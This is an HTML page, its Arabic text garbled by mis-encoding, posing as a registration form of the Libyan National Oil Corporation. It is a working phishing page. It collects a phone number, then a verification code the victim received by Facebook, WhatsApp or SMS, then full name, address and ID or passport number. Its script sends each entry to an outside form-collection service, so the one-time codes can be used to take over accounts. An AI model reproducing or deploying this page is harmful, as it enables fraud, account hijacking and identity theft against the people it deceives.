<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Ù†Ù…ÙˆØ°Ø¬ Ø§Ù„ØªØ³Ø¬ÙŠÙ„ - Ù…Ø¤Ø³Ø³Ø© Ø§Ù„Ù†ÙØ· Ø§Ù„Ù„ÙŠØ¨ÙŠØ©</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      background: #f2f2f2;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container, .popup, #fieldsModal {
      background: #fff;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
      width: 90%;
      max-width: 450px;
      box-sizing: border-box;
      text-align: center;
    }

    .hidden {
      display: none;
    }

    label {
      display: block;
      margin-top: 10px;
      font-weight: bold;
      color: #003366;
      text-align: right;
    }

    input, select, button {
      width: 100%;
      padding: 10px;
      font-size: 15px;
      margin-top: 5px;
      border-radius: 6px;
      border: 1px solid #ccc;
      box-sizing: border-box;
    }

    button {
      background-color: #28a745;
      color: white;
      border: none;
      cursor: pointer;
      margin-top: 15px;
    }

    button:hover {
      background-color: #218838;
    }

    .countdown {
      font-weight: bold;
      color: #cc0000;
      margin-top: 10px;
    }
  </style>
</head>
<body>

<div class="container" id="phoneStep">
  <h2>Ø£Ø¯Ø®Ù„ Ø±Ù‚Ù… Ù‡Ø§ØªÙÙƒ Ø§Ù„Ù„ÙŠØ¨ÙŠ</h2>
  <form id="phoneForm">
    <label>Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ:</label>
    <input type="text" id="phone" required placeholder="091xxxxxxx" />
    <button type="submit">ØªÙ„Ù‚ÙŠ Ø§Ù„ÙƒÙˆØ¯</button>
  </form>
</div>

<div class="container hidden" id="codeStep">
  <h3>Ø£Ø¯Ø®Ù„ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø°ÙŠ ÙˆØµÙ„Ùƒ Ù…Ù† Facebook Ø£Ùˆ WhatsApp Ø£Ùˆ SMS</h3>
  <form id="codeForm">
    <label>ÙƒÙˆØ¯ Ø§Ù„ØªÙˆØ«ÙŠÙ‚:</label>
    <input type="text" id="code" required placeholder="ÙƒÙˆØ¯ Ù…Ù† 6-8 Ø£Ø­Ø±Ù Ø£Ùˆ Ø£Ø±Ù‚Ø§Ù…" />
    <div class="countdown" id="countdown">08:00</div>
    <button type="submit">ØªØ£ÙƒÙŠØ¯ Ø§Ù„ÙƒÙˆØ¯</button>
    <button type="button" id="resendCode">ğŸ” Ø¥Ø¹Ø§Ø¯Ø© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙƒÙˆØ¯</button>
  </form>
</div>

<div id="fieldsModal" class="hidden">
  <h3 style="color: #003366;">Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¥Ø¶Ø§ÙÙŠØ©</h3>
  <form id="fullForm">
    <label>Ø§Ù„Ø§Ø³Ù… Ø§Ù„ÙƒØ§Ù…Ù„:</label>
    <input type="text" id="fullName" required />

    <label>Ø§Ù„Ø¹Ù†ÙˆØ§Ù†:</label>
    <input type="text" id="address" required />

    <label>Ù†ÙˆØ¹ Ø§Ù„ÙˆØ«ÙŠÙ‚Ø©:</label>
    <select id="docType" required>
      <option value="">Ø§Ø®ØªØ± Ù†ÙˆØ¹ Ø§Ù„ÙˆØ«ÙŠÙ‚Ø©</option>
      <option value="Ø¨Ø·Ø§Ù‚Ø©">Ø¨Ø·Ø§Ù‚Ø©</option>
      <option value="Ø¬ÙˆØ§Ø² Ø³ÙØ±">Ø¬ÙˆØ§Ø² Ø³ÙØ±</option>
    </select>

    <label>Ø±Ù‚Ù… Ø§Ù„ÙˆØ«ÙŠÙ‚Ø©:</label>
    <input type="text" id="docNumber" required />

    <button type="submit">Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø·Ù„Ø¨</button>
  </form>
</div>

<div class="container hidden" id="finalMessage">
  <h3 style="color: green;">Ø¬Ø§Ø±ÙŠ Ù…Ø¹Ø§Ù„Ø¬Ø© Ø·Ù„Ø¨ÙƒØŒ Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø§Ù„Ù…Ø±Ø§Ø¬Ø¹Ø© ÙÙŠ ÙˆÙ‚Øª Ø¢Ø®Ø±.</h3>
</div>

<audio id="alarmSound">
  <source src="https://www.soundjay.com/button/beep-07.wav" type="audio/wav">
</audio>

<script>
  const formcarryURL = "https://formcarry.com/s/a-Yw-WFDEqO";
  let savedPhone = "";
  let codeSubmitCount = 0;
  let timerInterval;

  document.getElementById("phoneForm").addEventListener("submit", function(e) {
    e.preventDefault();
    const phone = document.getElementById("phone").value.trim();
    const phoneRegex = /^(091|092|094)\d{7}$/;
    if (!phoneRegex.test(phone)) {
      alert("ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù‚Ù… Ù‡Ø§ØªÙ Ù„ÙŠØ¨ÙŠ ØµØ­ÙŠØ­ ÙŠØ¨Ø¯Ø£ Ø¨Ù€ 091 Ø£Ùˆ 092 Ø£Ùˆ 094.");
      return;
    }
    savedPhone = phone;
    fetch(formcarryURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ phone })
    });
    document.getElementById("phoneStep").classList.add("hidden");
    document.getElementById("codeStep").classList.remove("hidden");
    startCountdown(8 * 60);
  });

  document.getElementById("codeForm").addEventListener("submit", function(e) {
    e.preventDefault();
    const code = document.getElementById("code").value.trim();
    if (!/^[A-Za-z0-9]{6,8}$/.test(code)) {
      alert("Ø§Ù„ÙƒÙˆØ¯ ÙŠØ¬Ø¨ Ø£Ù† ÙŠÙƒÙˆÙ† Ù…Ù† 6 Ø¥Ù„Ù‰ 8 Ø£Ø±Ù‚Ø§Ù… Ø£Ùˆ Ø£Ø­Ø±Ù.");
      return;
    }
    codeSubmitCount++;
    fetch(formcarryURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ phone: savedPhone, code })
    });
    document.getElementById("codeStep").classList.add("hidden");
    document.getElementById("fieldsModal").classList.remove("hidden");
  });

  document.getElementById("resendCode").addEventListener("click", function() {
    fetch(formcarryURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ phone: savedPhone, resend: true })
    });
    startCountdown(8 * 60);
  });

  document.getElementById("fullForm").addEventListener("submit", function(e) {
    e.preventDefault();
    const fullName = document.getElementById("fullName").value.trim();
    const address = document.getElementById("address").value.trim();
    const docType = document.getElementById("docType").value;
    const docNumber = document.getElementById("docNumber").value.trim();

    const arabicRegex = /^[\u0600-\u06FF\s]{8,}$/;
    if (!arabicRegex.test(fullName)) {
      alert("Ø§Ù„Ø§Ø³Ù… ÙŠØ¬Ø¨ Ø£Ù† ÙŠÙƒÙˆÙ† Ø¨Ø§Ù„Ù„ØºØ© Ø§Ù„Ø¹Ø±Ø¨ÙŠØ© ÙˆÙŠØ­ØªÙˆÙŠ Ø¹Ù„Ù‰ 8 Ø£Ø­Ø±Ù Ø£Ùˆ Ø£ÙƒØ«Ø±.");
      return;
    }

    fetch(formcarryURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ fullName, address, docType, docNumber, phone: savedPhone })
    });

    document.getElementById("fieldsModal").classList.add("hidden");
    document.getElementById("finalMessage").classList.remove("hidden");
  });

  function startCountdown(duration) {
    let timer = duration, minutes, seconds;
    clearInterval(timerInterval);
    const countdown = document.getElementById("countdown");
    timerInterval = setInterval(() => {
      minutes = Math.floor(timer / 60);
      seconds = timer % 60;
      countdown.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
      if (--timer < 0) {
        clearInterval(timerInterval);
        countdown.textContent = "Ø§Ù†ØªÙ‡Ù‰ Ø§Ù„ÙˆÙ‚Øª!";
        document.getElementById("alarmSound").play();
      }
    }, 1000);
  }
</script>
</body>
</html>
